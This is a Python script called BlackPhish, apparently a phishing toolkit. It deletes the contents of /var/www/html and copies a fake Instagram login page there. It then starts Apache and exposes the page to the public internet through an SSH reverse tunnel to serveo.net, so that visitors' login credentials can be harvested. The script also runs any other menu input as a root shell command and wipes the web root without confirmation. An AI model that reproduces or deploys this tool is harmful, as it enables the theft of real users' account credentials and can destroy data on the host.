#!/usr/bin/python3

# version 2.1: - Changed some colors and user interface - Added a menu

# Please update version number each time we update


# Libraries #
try:
    import os
except ImportError:
    print("\033[31;1m" + "[!] Import Error, Aborting! \033[0m")
    exit(1)

# Variables #
cwd = os.getcwd()

# COLORS #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"

# Check for root #
if os.geteuid() != 0:
    exit(red + "[!] Please run as root" + reset)

# Port forward to serveo #
def serveo_forward():
    os.system('ssh -o ServerAliveInterval=3000 -R inc0gnit0:80:localhost:80 serveo.net')
    #subprocess.Popen(["rm","-r","some.file"])

# Banner #
def banner():
    print('''
 \033[91;1m
                https://github.com/iinc0gnit0/BlackPhish \033[94;1m

                             ░███░                                   ░█░   
                           ░█████                                  ░███    
                          ▒█████▓                                ░███░     
                         ████████                               ████▓      
                       ░█████████░                            ░█████       
                     ░█████████████                          ░██████       
          ░░▒███████████████████████████░░░                 ▓██████░       
 ░░░░███████████████████████████████████████████▓░▒█░     ░███████░        
█████████████████████████████████████████████████████████████████          
 ░████████████████████████████████████████████████████████████████░        
     ░░▓██████████████████████████████████████▓░░░██▓      ░░██████░       
             ░░░░▒█████████████████████░████░                  ░█████░     
                  ██████                 ░                                 
                  ░█████                                                   
                   ░████                                                   
                    ░███                                                   
                      ░█      
                                                      \033[91m
        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
        
                
                    Banner made by: \033[91m[tuf_unkn0wn]\033[94;1m
                    
                    Script created by: \033[91m[inc0gnit0] [retro0001]\033[94;1m
                    
                    Websites created by: \033[91m[TableFlipGod] \033[0m''')
    print('\n')
    print(red + '        [1] ' + blue + 'Instagram')
    print('\n')

# Main Script #
def main():
    banner()

    choice = input(red + "        [BlackPhish] -> ") # Get user input #

    # Host Instagram Page #
    if choice == "1":
        print(green + '[+] Copying Files')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
        os.system('cp '+'-r '+ cwd  + '/Instagram/Instagram-Login/index.html' " /var/www/html/")
        print(green + '[+] Starting Apache2 Service')
        os.system('service apache2 start')
        print(green + '[+] Apache2 Service Started')
        serveo_forward()
        print(green + '[+] Done')
        main()

    # Clear #
    elif choice == "clear":
        os.system('clear')
        main()

    # Clean out everything #
    elif choice == "clean":
        print(green + '[+] Stopping Apache2 Service')
        os.system('service apache2 stop')
        print(green + '[+] Stopping Traffic forwarding to serveo')
        os.system('pkill -f inc0gnit0:80:localhost:80')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html')
        print(green + '[+] Done')
        main()
    
    # Exit #
    elif choice == 'exit':
        print(red + '[!] Exiting...')
        print(green + '[+] Have a nice day!')
    
    # Use shell #
    elif choice != "":
        os.system(""+choice)
        main()

    # Invalid Option Error #
    else:
        print(red + "[!] Invalid option" + reset)
        main()
        
# This will start the script #
try:
    if __name__ == '__main__':
        main()
        
# Will detect if they exit #
except KeyboardInterrupt:
    print("\n")
    print(red + "[!] KeyboardInterrupt Detected")
    print(red + "[!] Exiting" + reset)
    exit(0)